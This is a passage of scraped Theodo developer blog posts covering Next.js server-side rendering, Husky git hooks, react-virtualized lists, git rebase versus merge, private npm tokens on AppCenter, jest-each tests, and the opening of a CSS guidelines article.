changes on master branch\ninstall the dependencies with\u00a0yarn\nbuild the application with\u00a0yarn build\ndeclare babel environment in your terminal:\u00a0export BABEL_ENV=development\nlaunch your node server with\u00a0node server/bootstrap.js\nbrowse to\u00a0http://localhost:3001\u00a0to view the app\n\nStill simulating the \u20183G network\u2019 in Chrome, here is the result:\n\nDo not be mistaken, the page is rendered by server. But as soon as the javascript is fully loaded, window.document is available and the\u00a0isClientOrServer()\u00a0function returns\u00a0client.\nWe proved that we can do Server-side Rendering, but what\u2019s going on\u00a0with that React logo?!\nWe\u2019re missing many features\nOur example is a good proof of concept but very limited. We would like to see more features like:\n\nimport images in js files (logo problem)\nseveral routes usage or route management (check\u00a0this article)\ndeal with the\u00a0</head>\u00a0and the metatags (for SEO improvements)\ncode splitting (here is\u00a0an article\u00a0solving the problem)\nmanage the state of our app or use Redux (check this\u00a0great article\n\nand performance is bad on large pages:\u00a0ReactDOMServer.renderToString()\u00a0is a synchronous CPU bound call and can starve out incoming requests to the server. Walmart worked on\u00a0an optimization\u00a0for their e-commerce website.\nIt is possible to make Server-side Rendering\u00a0work perfectly on top of create-react-app, we won\u2019t go through all the painful work in this article. Still, if you\u2019re interested in it, I attached just above some great articles giving detailed explanations.\nSeriously\u2026 Next.js can bring you all these features!\n2) Next.js helps you building server rendered React.js Application\n\nWhat is Next.js?\nNext.js is a minimalistic framework for server-rendered React applications with:\n\na very simple page based routing\nWebpack hot reloading\nautomatic transpilation (with babel)\ndeployment facilities\nautomatic code splitting (loads page faster)\nbuilt in css support\nability to run server-side actions\nsimple integration with Redux using next-redux-wrapper.\n\nGet started in 1 minute\nIn this short example, we are going to see how crazy simple it is to have a server-side rendering app ready with Next.js.\nFirst, generate your package.json with\u00a0npm init\u00a0and install Next.js with\u00a0npm install --save next react react-dom. Then, add a script to your package.json like this:\n\"scripts\": {\r\n  \"dev\": \"next\",\r\n  \"build\": \"next build\",\r\n  \"start\": \"next start\"\r\n}\r\n\nCreate a pages/ folder. Every .js file becomes a route that gets automatically processed and rendered. Add a index.js file in that pages/ folder (with the execution of our\u00a0isClientOrServer\u00a0function):\nconst Index = ({ title = 'Hello from Next.js' }) => (\r\n  <div>\r\n    <h1>{title}</h1>\r\n    <p className=\"App-intro\">\r\n      Is my application rendered by server or client?\r\n    </p>\r\n    <h2><code>{isClientOrServer()}</code></h2>\r\n  </div>\r\n);\r\n\r\nexport default Index;\r\n\nNo need to import any library at the top of our index.js file, Next.js already knows that we are using React.\nNow enter\u00a0npm run dev\u00a0into your terminal and go to\u00a0http://localhost:3000: Tadaaaaa!\n\nRepeat the same operation inside your pages/ folder to create a new page. The url to access it will directly match the name you give to the file.\nYou\u2019re ready to go! You\u2019re already doing SSR. Check the\u00a0documentation on Next.js\u00a0official repository.\nUse create-next-app\nYou want to start a server-side rendered React app, you can now stop using create-react-app, and start using\u00a0create-next-app:\nnpm install -g create-next-app\r\n\r\ncreate-next-app my-app\r\ncd my-app/\r\nnpm run dev\r\n\nThis is all you need to do to create a React app with server-side rendering thanks to Next.js.\nFinally, better than a simple Hello World app, check this\u00a0Hacker News clone\u00a0implementing Next.js. It is fully server-rendered, queries the data over Firebase and updates in realtime as new votes come in.\nVue.js and Nuxt\nYou\u2019re maybe a Vue.js developer. Just after Next.js first release, two french brothers made the same for Vue.js: Nuxt was born! Like Vue, the Nuxt documentation is very clear and you can use the same starter template\u00a0vue-cli\u00a0for you app:\n vue init nuxt-community/starter-template <project-name> \nWhat\u2019s Next? \nHope you liked this article which was mainly written in order to introduce server-side rendering with Next.\nIf you are interested in server-side rendering for your existing React application, in the following, I am going to demonstrate how to migrate your existing create-react-app to Next.js. Coming soon\u2026\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBaptiste Jan\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer @Theodo. I like Vue.js and all the ecosystem growing around.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\ttl:dr\nTo add a pre-commit git hook with Husky:\n\nInstall Husky with npm install husky --save-dev\nSet the pre-commit command in your package.json:\n\n\"scripts\": {\r\n    \"precommit\": \"npm test\"\r\n},\r\n\nWhat are git hooks?\nGit hooks are scripts launched when carrying out some git actions. The most common one is the pre-commit hook that\u00a0runs when performing git commit, before the commit is actually created.\nThe scripts are located in the .git/hooks folder. Check out the\u00a0.sample file examples in your local git repository.\n\nWhy do I need to install the Husky\u00a0package then?\nThe problem with git hooks is that they are in the .git directory, which means that they are not committed hence not shared between developers.\nHusky takes care of this: when a developer runs npm install, it will automatically create the scripts in .git/hooks:\n\nTheses scripts will parse your package.json and run the associated command. For example, the pre-commit script will run the npm run precommit command\n\"scripts\": {\r\n    \"precommit\": \"npm test\"\r\n},\r\n\nTo add husky to your project, simply run npm install husky --save-dev.\nFor more complex commands, I recommend to use a separate bash script :\u00a0\"precommit\": \"bash ./scripts/check-lint.sh\".\nEnhancing your git flow\nGit hooks are a convenient way to automate tasks during your git flow and protect you from pushing unwanted code by mistake.\n\nCheck for linting errors\n\nIf you have tools to check the code quality or formatting, you can run it on a pre-commit hook:\n\"scripts\": {\r\n    \"precommit\": \"prettier-check \\\"**/*.js\\\" && eslint . --quiet\"\r\n},\r\n\nI advise to run those tests on your CI tool as well, but checking it on a precommit hook can make you\u00a0save a lot of time as you won\u2019t have to wait for your CI to set up your whole project and fail only because you forgot a\u00a0semicolon.\n\nProtect important branches\n\nIn some rare situations, you have to push code directly on a branch that is deployed. One way to protect\u00a0it from developers in a hurry who forget to run the tests locally is to launch them on a pre-push hook:\n\"scripts\": {\r\n    \"prepush\": \"./scripts/pre-push-check.sh\"\r\n},\r\n\n\n#!/bin/bash\r\nset -e\r\n\r\nbranch=$(git branch | sed -n -e 's/^\\* \\(.*\\)/\\1/p')\r\nif [ \"$branch\" == \"master\" ]\r\nthen\r\n    npm test\r\nfi\r\n\n\nIf your tests fail, the code won\u2019t be pushed.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHugo Lime\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo.\r\n\r\nPassionate about new technologies to make web apps stronger and faster.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy\nWhat is a Virtual DOM ?\nThe virtual DOM (VDOM) is a programming concept where an ideal, or \u201cvirtual\u201d, representation of a UI is kept in memory.\nThen, it is\u00a0synced with the \u201creal\u201d DOM by a library such as ReactDOM. This process is called\u00a0reconciliation.\nPerformance\u00a0and\u00a0windowing\nYou might know that React uses this virtual DOM. Thus, it is only when React renders elements that the user will have them into his/her HTML DOM.\nSometimes you might want to display a lot of html elements, like for grids,\u00a0lists, calendars, dropdowns etc and the user will often complain about performance.\n\nHence, a good way\u00a0to display a lot of information is to \u2018window\u2019\u00a0it. The idea is to create only elements the user can see. An example is the Kindle vs Book. While the book is a heavy object because it \u2018renders\u2019 all the pages, the Kindle only display what the user can see.\nReact-Virtualized\nThat is how Brian Vaughn came up with the idea of creating React-Virtualized.\nIt is an open-source library which provides you many components in order to window some of your application List, Grid etc\nAs a developer, you do not want to reinvent the wheel. React-virtualized is a stable and maintained library. Its community is large and as it is open-source, many modules and extensions are already available in order to window a maximum of elements.\nFurthermore, it offers lots of functionalities and customization that you would not even think about.\nWe will discuss about it later, but before, let\u2019s see when to use React-virtualized.\nWhen\nWhen thinking about performance, lots of actions can be taken, but\u00a0React official website\u00a0already got a complete article to be read. In consequence, if you face a performance problem, be sure you have already done all of these before to start to window your application (but stay pragmatic).\nHow\nGetting into it\nOk, now that you\u2019re convinced, let\u2019s go throught the real part.\n\nYou can begin by following instructions for installing the right package via npm and look at simple examples here : React virtualized github.\u00a0However,\u00a0I\u2019m going to show you a complex example so you can use React-Virtualized in an advanced way.\nReact-Virtualized 101\nTo render a windowed list, no need for digging one hour a complex documentation, React-Virtualized is very simple to use.\nFirstly, you use the List component from the library, then, the few important props are the next one:\n\nwidth: the width of the List\nheight: the height of the List\nrowCount: the number of elements you will display\nrowHeight: the height of each row you will display\nrowRenderer: a callback method to define yourself depending on what you want to do with your data. This method is the core of your list, it is here that you define what will be rendered thanks to your data.\n\nThe example\n\r\nimport React from 'react';\r\nimport { List } from 'react-virtualized';\r\n\r\n// List data as an array of strings\r\nconst list = [\r\n 'Easy windowing1',\r\n 'Easy windowing2',\r\n // And so on...\r\n];\r\n\r\nfunction rowRenderer({\r\n key, // Unique key within array of rows\r\n index, // Index of row within collection\r\n isScrolling, // Used for performance\r\n isVisible, // Used for performancee\r\n style, // Style object to be applied to row (to position it)\r\n}) {\r\n return (\r\n\r\n<div key={key} style={style}>\r\n   {list[index]}\r\n </div>\r\n\r\n );\r\n}\r\n\r\n// Render your list\r\nconst ListExample = () => (\r\n <List width={300} height={300} rowCount={list.length} rowHeight={20} rowRenderer={rowRenderer} />\r\n);\r\n\nClick here to see a demo\nA more complex virtualized list:\nDisplay a virtualized list might be easy, but you might have a complicated behaviour to implement.\n\nIn this advanced example, we will:\n\nUse the AutoSizer HOC to automatically calculate the size the List will fill\nBe able to display row with a dynamic height using the CellMeasurer\nBe able to use the CellMeasurer even if the data are not static\n\nThis advanced example goes through 4 steps:\n\nInstantiate the AutoSizer and List component\nSee how the CellMeasurer and the CellMeasurerCache work\nLearn how we use them in the rowRenderer\nGo further with using these on a list that does not contain a stable number of elements\n\nThe example\nLet\u2019s look first at how we render the list:\n\u00a0\n\r\nimport {\r\n AutoSizer,\r\n List,\r\n CellMeasurer,\r\n CellMeasurerCache,\r\n} from 'react-virtualized';\r\n...\r\n<AutoSizer>\r\n {({ height, width }) => (\r\n  <List\r\n    width={width}\r\n    height={height}\r\n    rowGetter={({ index }) => rows[index]}\r\n    rowCount={1000}\r\n    rowHeight={40}\r\n    rowRenderer={this.rowRenderer}\r\n    headerHeight={20}\r\n  />\r\n )}\r\n</AutoSizer>\r\n\nIt is very simple:\n\nWe wrap the list with the AutoSizer HOC\nIt uses the CellMeasurerCache to know the height of each row and the rowRenderer to render the elements.\n\nHow it works :\nFirst, you instantiate a new CellMeasurerCache that will contain all the calculated heights :\n\r\nconstructor(props) {\r\n super(props);\r\n this.cache = new CellMeasurerCache({ //Define a CellMeasurerCache --> Put the height and width you think are the best\r\n defaultHeight: 80,\r\n minHeight: 50,\r\n fixedWidth: true,\r\n });\r\n}\r\n\nThen, you use the CellMeasurer in the rowRenderer method:\n\r\nrowRenderer = ({\r\n   key, // Unique key within array of rows\r\n   index, // Index of row within collection\r\n   parent,\r\n   isScrolling, // The List is currently being scrolled --> Important if you need some perf adjustment\r\n   isVisible, // This row is visible within the List (eg it is not an overscanned row)\r\n   style, // Style object to be applied to row (to position it)\r\n}) => (\r\n   <CellMeasurer\r\n     cache={this.cache}\r\n     columnIndex={0}\r\n     key={key}\r\n     parent={parent}\r\n     rowIndex={index}\r\n   >\r\n   <div\r\n     className=\"Row\"\r\n     key={key}\r\n     style={{\r\n       ...style,\r\n       display: 'flex',\r\n     }}\r\n   >\r\n     <span style={{ width: 400 }}>{rows[index].name}</span>\r\n     <span style={{ width: 100 }}>{rows[index].age}</span>\r\n   </div>\r\n   </CellMeasurer>\r\n);\r\n\n\u00a0\nPitfall:\nFinally, we obtain a nice windowed list, ready to be deployed and used\u2026\nUnless your application contain filters or some data added dynamically.\nActually, when I implemented this, after using some filters, some blank spaces were staying in the list.\nIt is a performance consideration due to the fact we use a cache, but it is a good compromise unless you have many rows and many columns in a Grid (as we display a list, we only have 1 column).\nConsequently, I managed to fix this issue by clearing the cache every time my list had its data reloaded:\n\r\ncomponentWillReceiveProps() { //Really important !!\r\n this.cache.clearAll(); //Clear the cache if row heights are recompute to be sure there are no \"blank spaces\" (some row are erased)\r\n this.virtualizedList && this.virtualizedList.recomputeRowHeights(); //We need to recompute the heights\r\n}\r\n\nA big thanks to\u00a0Brian Vaughn\u00a0for this amazing library\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCyril Gaunet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThanks to a new colleague of mine, I have learned how to make my git history cleaner and more understandable. \nThe principle is simple: rebase your branch before you merge it. But this technique also has weaknesses. In this article, I will explain what a rebase and a merge really do and what are the implications of this technique.\nBasically, here is an example of my git history before and after I used this technique.\n\nStay focus, rebase and merge are no joke! \nWhat is the goal of a rebase or a merge ?\nRebase and merge both aim at integrating changes that happened on another branch into your branch.\nWhat happens during a merge ?\nFirst of all there are two types of merge:\n\nFast-forward merge\n3-way merge\n\nFast-forward merge\nA fast-forward merge happens when the most recent shared commit between the two branches is also the tip of the branch in which you are merging.\nThe following drawing shows what happens during a fast-forward merge and how it is shown on a graphical git software.\nA: the branch in which you are merging\nB: the branch from which you get the modifications\n\ngit checkout A\ngit merge B\n\n\nAs you can see, git simply brings the new commits on top of branch A. After a fast-forward merge, branches A and B are exactly the same.\nNotes:\n\ngit checkout A, git rebase B you would have had the exact same result!\ngit checkout B, git merge A would have left the branches in the \u201cbefore\u201d situation, since branch A has no new commits for branch B.\n\n3-way merge\nA 3-way merge happens when both branches have had new commits since the last shared commit.\nThe following drawing shows what happens during a 3-way merge and how it is shown in a graphical git software.\nA: the branch in which you are merging\nB: the branch from which you get the modifications\n\ngit checkout A\ngit merge B\n\n\nDuring a 3-way merge, git creates a new commit named \u201cmerge commit\u201d (in orange) that contains:\n\nAll the modifications brought by the three commits from B (in purple)\nThe possible conflict resolutions\n\nGit will keep all information about the commits of the merged branch B even if you delete it. On a graphical git software, git will also keep a small loop to represent the merge.\nThe default behaviour of git is to try a fast-forward merge first. If it\u2019s not possible, that is to say if both branch have had changes since the last shared commit, it will be a 3-way merge.\nWhat happens during a rebase?\nA rebase differ from a merge in the way in which it integrates the modifications.\nThe following drawings show what happens during a rebase and how it is shown in a graphical git software.\nA: the branch that you are rebasing\nB: the branch from which you get the new commits\n\ngit checkout A\ngit rebase B\n\n\n\nWhen you rebase A on B, git creates a temporary branch that is a copy of branch B, and tries to apply the new commits of A on it one by one.\nFor each commit to apply, if there are conflicts, they will be resolved inside of the commit.\nAfter a rebase, the new commits from A (in blue) are not exactly the same as they were:\n\nIf there were conflicts, those conflicts are integrated in each commit\nThey have a new hash\n\nBut they keep their original date which might be confusing since in the final branch, commits in blue were created before the two last commits in purple.\nWhat is the best solution to integrate a new feature into a shared branch and keep your git tree clean?\nLet say that you have a new feature made of three new commits on a branch named `feature`. You want to merge this branch into a shared branch, for exemple `master` that has received two new commits since you started from it.\nYou have two main solutions: \nFirst solution: \n\ngit checkout feature\ngit rebase master\ngit checkout master\ngit merge feature\n\n\nNote : Be careful, git merge feature should do a fast-forward merge, but some hosting services for version control do a 3-way merge anyway. To prevent this, you can use git merge feature \u2013ff-only\nSecond solution:\n\ngit checkout master\ngit merge feature\n\n\nAs you can see, the final tree is more simple with the first solution. You simply have a linear git history. On the opposite, the second solution creates a new \u201cmerge commit\u201d and a loop to show that a merge happened.\nIn this situation, the git tree is still readable, so the advantage of the first solution is not so obvious. The complexity emerges when you have several developers in your team, and several feature branches developed at the same time. If everyone uses the second solution, your git tree ends up complex with several loop, and it can even be difficult to see which commits belong to which branch!\nUnfortunately, the first solution has a few drawbacks:\nHistory rewriting\nWhen you use a rebase, like in the first solution, you \u201crewrite history\u201d because you change the order of past commits on your branch. This can be problematic if several developers work on the same branch: when you rewrite history, you have to use git push \u2013 \u2013 force in order to erase the old branch on the remote repository and put your new branch (with the new history) in its place.\nThis can potentially erase changes another developer made, or introduce conflicts resolution for him.\nTo avoid this problem, you should only rebase branches on which you are the only one working. For example in our case, if you are the only one working on the feature branch.\nHowever you might sometime have to rewrite history of shared branches. In this case, make sure that the other developers working on the branch are aware of it, and are available to help you if you have conflicts to resolve.\nThe obvious advantage of the 3-way merge here, is that you don\u2019t rewrite history at all.\nConflicts resolution\nWhen you merge or rebase, you might have to resolve conflicts.\nWhat I like about the rebase, is that the conflicts added by one commit will be resolved in this same commit. On the opposite, the 3-way merge will resolve all the conflicts into the new \u201cmerge commit\u201d, mixing all together the conflicts added by the different commits of your feature branch.\nThe only problem with the rebase is that you may have to resolve more conflicts, due to the fact that the rebase applies the commits of your branch one by one.\nConclusion\nTo conclude, I hope I have convinced you that rebasing your branch before merging it, can clear your git history a lot! Here is a recap of the advantages and disadvantages of the rebase and merge method versus the 3-way merge method:\n\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJ\u00e9r\u00e9mie Marniquet Fabre\r\n  \t\t\t\r\n  \t\t\t\tI am an agile web developer at Theodo, I enjoy outdoor sports (mountain biking, skiing...) and new technologies !  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAppCenter is a great CI platform for Mobile Apps. At Theodo we use it as the standard tool for our react-native projects.\nIn a recent project, we needed to have a shared NPM package between the React and React-Native applications. There is no mention of how to achieve this in the AppCenter documentation, and if you ask their support they will say it\u2019s not possible.\nMe: Hello, we\u2019re wanting to have a shared library used in our project. This would require an npm install from a private NPM repo (through package cloud). What is the best practice for adding a private npm access on the AppCenter CI?\nMicrosoft: We currently only support cloud git repositories hosted on VSTS, Bitbucket and GitHub. Support for private repos is not available yet but we are building new features all the time, you can keep an eye out on our roadmap for upcoming features.\nLuckily there is a way!\n\nAppCenter provides the ability to add an `appcenter-post-clone.sh` script to run after the project is cloned. To add one, just add a file named `appcenter-post-clone.sh`, push your branch and, on the configure build screen, see it listed.\n\nPro Tip: You need to press \u201cSave and Build\u201d on the build configuration after pushing a new post-clone script on an existing branch.\nNow, what to put in the script?\nHaving a .npmrc in the directory you run \u2018npm install\u2019 or \u2018yarn install\u2019 from allows you to pass authentication tokens for new registries.\nWe want a .npmrc like this:\n\r\nalways-auth=true\r\nregistry=https://YOUR_PACKAGE/NAME/:_authToken=XXXXXXXX\r\n\nObviously, we don\u2019t really want to commit our read token to our source code, therefore we should use an environment variable.\nSo we can add to our post-clone script:\n\r\ntouch .npmrc\r\necho \"always-auth=true\r\nregistry=https://YOUR_PACKAGE/NAME/:_authToken=${READ_TOKEN}\" > .npmrc\r\n\nNow, on AppCenter, we can go into the build configuration and add an environment variable called \u2018READ_TOKEN\u2019.\n\nNow rebuild your branch and your package installs should pass.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tjest-each is a small library that lets you write jest test cases with just one line.\nIt was added to Jest in version 23.0.1 and makes editing, adding and reading tests much easier. This article will show you how a jest-each test is written with examples of where we use it on our projects.\nA simple example jest test for a currencyFormatter function looks like this:\ndescribe('currencyFormatter', () => {\r\n  test('converts 1.59 to \u00a31.59', () => {\r\n    const input = 1.59;\r\n    const expectedResult = \"\u00a31.59\"\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n  test('converts 1.599 to \u00a31.60', () => {\r\n    const input = 1.599;\r\n    const expectedResult = \"\u00a31.60\"\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nThe currencyFormatter function takes in one number argument, input, and returns a string of the number to 2 decimal places with a \u00a3 prefix. Simple.\nBut, what if you want to add more test cases? Maybe you want your currencyFormatter to comma separate thousands, or handle non-number inputs in a certain way. With the standard jest tests above, you\u2019d have to add five more lines per test case.\nWith jest-each you can add new test cases with just one line:\ndescribe('currencyFormatter', () => {\r\n  test.each`\r\n    input     | expectedResult\r\n    ${'abc'}  | ${undefined}\r\n    ${1.59}   | ${'\u00a31.59'}\r\n    ${1.599}  | ${'\u00a31.60'}\r\n    ${1599}   | ${'\u00a31,599.00'}\r\n    // add new test cases here\r\n  `('converts $input to $expectedResult', ({ input, expectedResult }) => {\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nThere are 4 parts to writing a jest-each test:\n\nThe first line in the template string:\n\ntest.each`\r\n  input | expectedResult\r\n...\r\n`\r\n\nThis defines the variable names for your test, in this case input and expectedResult. Each variable must be seperated by a pipe | character, and you can have as many as you want.\n\nThe test cases:\n\n`...\r\n  ${'abc'}  | ${undefined}\r\n  ${1.59}   | ${'\u00a31.59'}\r\n  ${1.599}  | ${'\u00a31.60'}\r\n  ${1599}   | ${'\u00a31,599.00'}\r\n  // add new test cases here\r\n`\r\n...\r\n\nEach line after the first represents a new test. The variable values are set to the relevant variable names in the first row and they are also seperated by a pipe | character.\n\nPrint message string replacement:\n\n('$input converts to $expectedResult', ...)\r\n\nYou can customise the print message to include variable values by prefixing your variable names with the dollar symbol $. This makes it really easy to identify which test case is failing when you run your tests. For example, the print messages for the example test above looks like this:\n\n\nPassing the variables into the test:\n\n('$input converts to $expectedResult', ({ input, expectedResult }) => {\r\n  expect(someFunction(input)).toBe(expectedResult)\r\n})\r\n\nAn object of variables is passed to the test as the first argument of the anonymous function where you define your test assertions. I prefer to deconstruct the object in the argument.\njest-each with Older Versions of Jest\nYou can still use jest-each with older versions of Jest by installing it independently:\nnpm install jest-each\r\n\nThere are a just two things that you\u2019ll need to do differently in your test files:\n\nImport jest-each at the top of your test file\nUse each``.test instead of test.each``\n\nThe currencyFormatter test above would look like this instead:\nimport each from 'jest-each'\r\n\r\n describe('currencyFormatter', () = {\r\n   each`\r\n     input     | expectedResult\r\n     ${1.59}   | ${'\u00a31.59'}\r\n     ${1.599}  | ${'\u00a31.60'}\r\n     // add new test cases here\r\n   `.test('converts $input to $expectedResult', ({ input, expectedResult }) => {\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nAnd that\u2019s all there is to it! Now you have enough to start writing tests with jest-each!\njest-each Tests\nService Test Example\njest-each makes testing services, like a currencyFormatter, very quick and easy. It\u2019s also amazing for test driven development if that\u2019s how you like to develop. We have found it has been really useful for documenting how a service is expected to work for new developers joining a project because of how easy the test cases are to read.\nFor example:\nimport currencyFormatter from 'utils/currencyFormatter'\r\n\r\ndescribe('currencyFormatter', () => {\r\n  test.each`\r\n    input    | configObject | expectedResult | configDescription\r\n    ${'abc'} | ${undefined} | ${undefined}   | ${'none'}\r\n    ${5.1}   | ${undefined} | ${'\u00a35.10'}     | ${'none'}\r\n    ${5.189} | ${undefined} | ${'\u00a35.19'}     | ${'none'}\r\n    ${5}     | ${{dec: 0}}  | ${'\u00a35'}        | ${'dec: 0'}\r\n    ${5.01}  | ${{dec: 0}}  | ${'\u00a35'}        | ${'dec: 0'}\r\n    // add new test cases here\r\n  `('converts $input to $expectedResult with config: $configDescription',\r\n    ({ input, configObject, expectedResult} ) => {\r\n      expect(currencyFormatter(input, configObject)).toBe(expectedResult)\r\n    }\r\n  )\r\n})\r\n\nHere we have a slightly more complicated currencyFormatter function that takes an extra configObject argument. We want to test that:\n\nit returns undefined when input is not a number\nthe default number of decimal places is 2\nthat the configObject can set the number of decimal places with the dec key\n\nWe want to be able to identify the tests when they are running so we have also added a configDescription variable so we can add some text to the test\u2019s print message.\nHigher Order Component Test Example\nWe like to use jest-each to test and document the properties added to components by higher order components (HOCs). I\u2019ve found this simple test particularly helpful when refactoring our large codebase of HOCs, where it has prevented bugs on multiple occasions. We have even added a project snippet so that setting up this test for new HOCs is even easier:\nimport { shallow } from 'enzyme'\r\nimport HomePage from '/pages'\r\nimport isLoading from '/hocs'\r\n\r\nconst TestComponent = isLoading(HomePage)\r\n\r\ndescribe('wrapper', () => {\r\n  const component = shallow(<TestComponent/>)\r\n  test.each`\r\n    propName\r\n    ${'isLoading'}\r\n    // add new test cases here\r\n  `('wrapper adds $propName to the component', ({ propName }) => {\r\n    expect(Object.keys(component.props()).toContainEqual(propName)\r\n  })\r\n\r\n  test.each`\r\n    propName\r\n    ${'notThisProp'}\r\n    ${'orThisOne'}\r\n    // add new test cases here\r\n  `('wrapper does not add $propName to the component',\r\n    ({ propName }) => {\r\n      expect(Object.keys(component.props()).not.toContainEqual(propName)\r\n    }\r\n  )\r\n})\r\n\nSnapshot Branches Test Example\nYou can also test multiple snaphsot branches succintly by using jest-each:\nimport Button from '/components'\r\n\r\ndescribe('Component', () => {\r\n  const baseProps = {\r\n    disabled: false,\r\n    size: 'small',\r\n  }\r\n  test.each`\r\n    changedProps        | testText\r\n    ${{}}               | ${'base props'}\r\n    ${{disabled: true}} | ${'disabled = true'}\r\n    ${{size: 'large'}}  | ${'size = large'}\r\n    // add new test cases here\r\n  `('snapshot: $testText', ({ changedProps }) => {\r\n    const component = shallow(<Button {...baseProps} {...changedProps} />)\r\n    expect(component).toMatchSnaphot()\r\n  })\r\n})\r\n\nYou can learn more about snapshot tests here.\nThese three types of tests, plus some Cypress integration and end-to-end tests is enough for our current application\u2026 but that discussion is for another post.\nHappy testing with jest-each!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMike Riddelsdell\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThrough my experiences, I encountered many fellow coworkers that found CSS code painful to write, edit and maintain. For some people, writing CSS is a chore. One of the reasons for that may be that they have never been properly taught how to write good CSS in the first place, nor what is good CSS. Thus it has an impact on their efficiency and on the code quality, which isn\u2019t what we want. This two parts article will focus on:\n\nPart 1: What is good CSS code? (more precisely, what is not good CSS). I will focus on actionable tips and tricks to avoid creating technical debt starting now.\nPart 2: how to migrate from a complex legacy stylesheet to a clean one.\n\nWarning: these are the guidelines that I gathered through my experiences and that worked well for many projects I worked on. In the end, adopt the methods that fit your needs.\nRequirements\nI assume that you are looking for advice to improve yourself at writing CSS, thus you have a basic knowledge of CSS and how it works. In addition, you will need these things:\nA definition of done\nYou should be very clear about which browser/devices you want to support or not. You must list browsers/devices you want to support and stick to it. Here is an example of what can be a definition of done:\n\nBrowsers: Chrome \u2265 63, Firefox \u2265 57, Edge \u2265 12\nDevices: laptops with resolution \u2265 1366*768\n\nYou must write this list with a business vision: maybe your business needs IE support because 20% of your users are using it. You can be specific for some features. For instance: the landing page should work on devices with small screens but the app behind the login should not.\nBut if your Definition Of Done does not include IE9, do not spend unnecessary time fixing exotic IE9 bugs. From there you can use caniuse.com to see which CSS features are supported on your target browsers (example below).\n\nA good understanding of what specificity is\nHere is a quick reminder about what is specificity:\nSpecificity determines which CSS rule is applied by the browsers. If two selectors apply to the same element, the one with higher specificity wins.\nThe rules to win the specificity wars are:\n\nInline style beats ID selectors. ID selectors are more specific than classes and attributes (::hover,\u00a0::before\u2026). Classes win over element selectors.\nA more specific selector beats any number of less specific selectors. For instance,\u00a0.list\u00a0is more specific than\u00a0div ul li.\nIncreasing the number of selectors will result in higher specificity. .list.link\u00a0is more specific than\u00a0.list and .link.\nIf two selectors have the same specificity, the last rule read by the browser wins.\nAlthough !important\u00a0has nothing to do with the specificity of a selector, it is good to know that a declaration using !important overrides any normal declaration. When two conflicting declarations have the !important keyword, the declaration with a greater specificity wins.\n\nHere is a good website to compute the specificity of a 